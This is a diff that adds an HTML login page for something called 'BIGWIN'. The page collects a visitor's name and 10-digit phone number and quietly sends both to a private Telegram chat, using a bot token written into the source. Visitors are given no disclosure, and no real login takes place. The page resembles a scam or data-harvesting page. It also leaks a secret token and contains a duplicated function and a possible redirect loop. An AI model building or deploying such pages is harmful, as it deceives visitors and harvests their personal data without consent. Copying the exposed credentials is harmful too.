@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BIGWIN - Login</title>
+    <link rel="stylesheet" href="index.css" />
+    <style>
+      .error-message {
+        display: none;
+        color: red;
+        font-size: 0.9em;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>BIGWIN</h1>
+    <div class="background-animation">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+
+    <div class="login-box">
+      <div class="clock" id="clock"></div>
+      <h2>Login</h2>
+      <input type="text" id="name" placeholder="Enter name" required />
+      <div class="error-message" id="name-error">
+        Please enter a valid name.
+      </div>
+      <input
+        type="text"
+        id="message"
+        placeholder="Enter number"
+        maxlength="10"
+        oninput="validateNumberInput(this)"
+        required
+      />
+      <div class="error-message" id="number-error">
+        Please enter a 10-digit number.
+      </div>
+      <button onclick="validateAndProcess()">Submit</button>
+    </div>
+
+    <script>
+      function getCookie(name) {
+        const nameEQ = name + "=";
+        const cookies = document.cookie.split(";");
+        for (let i = 0; i < cookies.length; i++) {
+          let cookie = cookies[i].trim();
+          if (cookie.indexOf(nameEQ) === 0) {
+            return decodeURIComponent(cookie.substring(nameEQ.length));
+          }
+        }
+        return null;
+      }
+
+      function validateAccess() {
+        const userName = getCookie("userName");
+        const userNumber = getCookie("userNumber");
+
+        if (!userName || !userNumber) {
+          // Redirect back to login if cookies are not set
+          window.location.href = "index.html";
+        }
+      }
+
+      validateAccess();
+      function updateClock() {
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = now.getMinutes().toString().padStart(2, "0");
+        const seconds = now.getSeconds().toString().padStart(2, "0");
+        const amPm = hours >= 12 ? "PM" : "AM";
+        hours = hours % 12 || 12;
+        const timeString = `${hours}:${minutes}:${seconds} ${amPm}`;
+        document.getElementById("clock").innerText = timeString;
+      }
+      setInterval(updateClock, 1000);
+
+      function validateNumberInput(input) {
+        input.value = input.value.replace(/[^0-9]/g, "");
+      }
+
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+        const expires = "expires=" + date.toUTCString();
+        document.cookie =
+          name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+      }
+
+      function getCookie(name) {
+        const nameEQ = name + "=";
+        const cookies = document.cookie.split(";");
+        for (let i = 0; i < cookies.length; i++) {
+          let cookie = cookies[i].trim();
+          if (cookie.indexOf(nameEQ) === 0) {
+            return decodeURIComponent(cookie.substring(nameEQ.length));
+          }
+        }
+        return null;
+      }
+
+      function checkCookiesAndRedirect() {
+        const userName = getCookie("userName");
+        const userNumber = getCookie("userNumber");
+
+        if (userName && userNumber) {
+          window.location.href = "home.html";
+        }
+      }
+
+      function sendMessageToTelegram(name, number) {
+        const chatId = "5786268361"; // Your Telegram chat ID
+        const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc"; // Your Telegram bot token
+        const message = `Name: ${name}\nNumber: ${number}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+          message
+        )}`;
+
+        fetch(url)
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.ok) {
+              window.location.href = "home.html";
+            } else {
+              alert("Error sending message: " + data.description);
+            }
+          })
+          .catch((error) => {
+            alert("Failed to send message.");
+          });
+      }
+
+      function validateAndProcess() {
+        const name = document.getElementById("name").value.trim();
+        const message = document.getElementById("message").value;
+        const nameError = document.getElementById("name-error");
+        const numberError = document.getElementById("number-error");
+
+        let isValid = true;
+
+        if (!name) {
+          nameError.style.display = "block";
+          isValid = false;
+        } else {
+          nameError.style.display = "none";
+        }
+
+        if (message.length !== 10) {
+          numberError.style.display = "block";
+          isValid = false;
+        } else {
+          numberError.style.display = "none";
+        }
+
+        if (isValid) {
+          setCookie("userName", name, 7); // Store for 7 days
+          setCookie("userNumber", message, 7); // Store for 7 days
+          sendMessageToTelegram(name, message);
+        }
+
+        
+      }
+
+      checkCookiesAndRedirect();
+      updateClock();
+    </script>
+  </body>
+</html>
